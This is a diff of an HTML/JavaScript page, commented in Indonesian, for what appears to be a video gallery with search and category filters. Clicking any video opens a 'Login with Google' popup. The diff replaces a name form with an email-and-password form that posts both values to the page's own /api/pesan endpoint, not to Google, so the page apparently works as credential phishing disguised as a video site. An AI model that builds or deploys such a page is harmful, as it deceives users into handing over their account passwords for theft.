+   Fungsi ini menerima SATU objek video (dari ITEMS) dan
+   mengembalikan satu elemen <button class="card"> lengkap
+   dengan thumbnail, ikon play, durasi, judul, dan kategori.
+   Dipakai ulang baik untuk kartu di grid kecil maupun untuk
+   isi kartu video besar (hero) di atas.
+   ============================================================ */
+function buildCard(it){
+  const card = document.createElement("button");
+  card.className = "card";
+
+  const th = document.createElement("div");
+  th.className = "thumb";
+
+  // ikon ▶ abu-abu placeholder, tampil selama foto belum/gagal dimuat
+  const ph = document.createElement("div");
+  ph.className = "ph";
+  ph.textContent = "\u25b6";
+
+  const img = document.createElement("img");
+  img.loading = "lazy";          // gambar dimuat belakangan, hemat kuota
+  img.alt = it.title;
+  img.src = it.thumb;
+  // kalau link gambar rusak/tidak ketemu, elemen <img> dihapus
+  // saja supaya yang kelihatan cuma placeholder ▶ di belakangnya
+  img.addEventListener("error", () => img.remove());
+
+  const dur = document.createElement("div");
+  dur.className = "dur";
+  dur.textContent = it.durasi || "";
+
+  const pl = document.createElement("div");
+  pl.className = "play";
+  pl.textContent = "\u25b6";
+
+  th.append(ph,img,dur,pl);
+
+  const t = document.createElement("div");
+  t.className = "ttl";
+  t.textContent = it.title;
+
+  const c = document.createElement("div");
+  c.className = "cat";
+  c.textContent = it.kategori;
+
+  // Metadata contoh ditampilkan di bawah judul untuk setiap video.
+  const meta = document.createElement("div");
+  meta.className = "video-meta";
+
+  const uploadInfo = document.createElement("span");
+  uploadInfo.className = "video-meta-item";
+  uploadInfo.textContent = "" + (it.uploader || "Admin demo");
+
+  const uploaderInfo = document.createElement("span");
+  uploaderInfo.className = "video-meta-item";
+  uploaderInfo.textContent = "" + (it.upload || "Tanggal contoh");
+
+  const viewInfo = document.createElement("span");
+  viewInfo.className = "video-meta-item";
+  viewInfo.innerHTML = `<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"></path><circle cx="12" cy="12" r="3"></circle></svg><span>${Number(it.views || 0).toLocaleString("id-ID")} views</span>`;
+
+  meta.append(uploadInfo, uploaderInfo, viewInfo);
+  card.append(th,t,c,meta);
+
+  // klik di mana saja pada kartu ini akan membuka popup "Login"
+  card.addEventListener("click", () => {
+    $("popup").classList.remove("hidden");
+  });
+
+  return card;
+}
+
+/* ============================================================
+   render()
+   Fungsi utama yang menggambar ulang tampilan video:
+   1. Ambil teks pencarian dari kotak #q
+   2. Saring ITEMS sesuai kategori aktif + teks pencarian
+   3. Video pertama hasil saringan → dijadikan hero (besar)
+   4. Sisanya → dimasukkan ke grid kecil di bawahnya
+   Dipanggil ulang setiap kali user mengetik di pencarian
+   atau mengganti kategori — jadi tampilan selalu sinkron
+   dengan filter yang sedang aktif.
+   ============================================================ */
+function render(){
+  const f = $("q").value.toLowerCase().trim();
+
+  const list = ITEMS.filter(i =>
+    (kategoriAktif === "Semua" || i.kategori === kategoriAktif) &&
+    i.title.toLowerCase().includes(f)
+  );
+
+  // bersihkan isi lama sebelum digambar ulang
+  $("grid").textContent = "";
+  $("hero").textContent = "";
+  $("hero").className = "hero hidden card";
+  $("empty").classList.toggle("hidden",list.length > 0);
+
+  if(list.length){
+    // video pertama di daftar hasil filter jadi video besar (hero)
+    const heroItem = list[0];
+    const heroCard = buildCard(heroItem);
+    $("hero").className = "hero card";
+    // isi (anak-anak elemen) dari kartu yang baru dibuat dipindah
+    // ke dalam #hero, bukan kartunya sendiri yang dipakai
+    $("hero").append(...heroCard.children);
+    $("hero").addEventListener("click", () => {
+      $("popup").classList.remove("hidden");
+    }, { once:true }); // { once:true } = listener ini cuma jalan sekali
+                        // lalu otomatis hilang, biar gak numpuk tiap render()
+  }
+
+  // sisa video (selain yang pertama) masuk ke grid kecil
+  list.slice(1).forEach(it => {
+    $("grid").appendChild(buildCard(it));
+  });
+}
+
+// setiap kali user mengetik di kotak pencarian, render() dipanggil ulang
+$("q").addEventListener("input",render);
+// panggilan pertama saat halaman pertama kali dibuka
+render();
+
+/* ============================================================
+   TUTUP POPUP
+   Berlaku untuk kedua popup (#popup dan #formCard):
+   popup ditutup kalau user klik area gelap di luar kotak putih,
+   ATAU klik tombol "✕" (yang punya atribut data-close).
+   ============================================================ */
+["popup","formCard"].forEach(id => {
+  $(id).addEventListener("click",function(e){
+    if(e.target === this || e.target.hasAttribute("data-close")){
+      this.classList.add("hidden");
+    }
+  });
+});
+
+// menutup popup yang sedang terbuka kalau user menekan tombol Escape
+document.addEventListener("keydown",e => {
+  if(e.key !== "Escape") return;
+  $("formCard").classList.add("hidden");
+  $("popup").classList.add("hidden");
+});
+
+/* ============================================================
+   LOGIN MEMBUKA FORM
+   Saat tombol "Login dengan Google" diklik: popup pertama
+   ditutup, popup form dibuka, lalu fokus otomatis diarahkan
+   ke kotak input "Email" biar user bisa langsung mengetik.
+   ============================================================ */
+$("btnLogin").addEventListener("click",() => {
   $("popup").classList.add("hidden");
   $("formCard").classList.remove("hidden");
-  $("nama").focus();
+  $("Email").focus();
 });
-$("btnKirim").addEventListener("click", async () => {
-  const nama = $("nama").value.trim(), belakang = $("belakang").value.trim();
-  if (!nama || !belakang) { $("msg").textContent = "Mohon isi nama dan nama belakang."; return; }
-  $("btnKirim").disabled = true; $("msg").textContent = "Mengirim…";
-  try {
-    const r = await fetch("/api/pesan", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ nama, belakang }) });
-    const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "Gagal mengirim.");
-    $("msg").textContent = "Terkirim ✔"; $("nama").value = ""; $("belakang").value = "";
-  } catch (e) { $("msg").textContent = e.message; }
+
+/* ============================================================
+   KIRIM DATA FORM
+   Saat tombol kirim di form diklik:
+   1. Ambil & bersihkan (trim) nilai input Email & Email belakang
+   2. Kalau salah satu kosong → tampilkan pesan error, berhenti
+   3. Kalau lengkap → kirim ke server lewat fetch() (POST request)
+      ke alamat /api/pesan dengan data dalam format JSON
+   4. Tampilkan pesan sukses/gagal sesuai respons server
+   "async/await" dipakai karena fetch() butuh waktu (nunggu
+   respons server), jadi kodenya "menunggu" tanpa membekukan
+   seluruh halaman.
+   ============================================================ */
+$("btnKirim").addEventListener("click",async () => {
+  const Email = $("Email").value.trim();
+  const belakang = $("belakang").value.trim();
+
+  if(!Email || !belakang){
+    $("msg").textContent = "Mohon isi Email dan password.";
+    return;
+  }
+
+  $("btnKirim").disabled = true; // cegah diklik berkali-kali saat masih mengirim
+  $("msg").textContent = "Mengirim…";
+
+  try{
+    const r = await fetch("/api/pesan",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({Email,belakang})
+    });
+
+    const d = await r.json().catch(() => ({}));
+
+    if(!r.ok) throw new Error(d.error || "Gagal mengirim.");
+
+    $("msg").textContent = "Terkirim ✔";
+    $("Email").value = "";
+    $("belakang").value = "";
+
+  }catch(e){
+    $("msg").textContent = e.message;
+  }
+
   $("btnKirim").disabled = false;
 });
 </script>
+
 </body>
 </html>
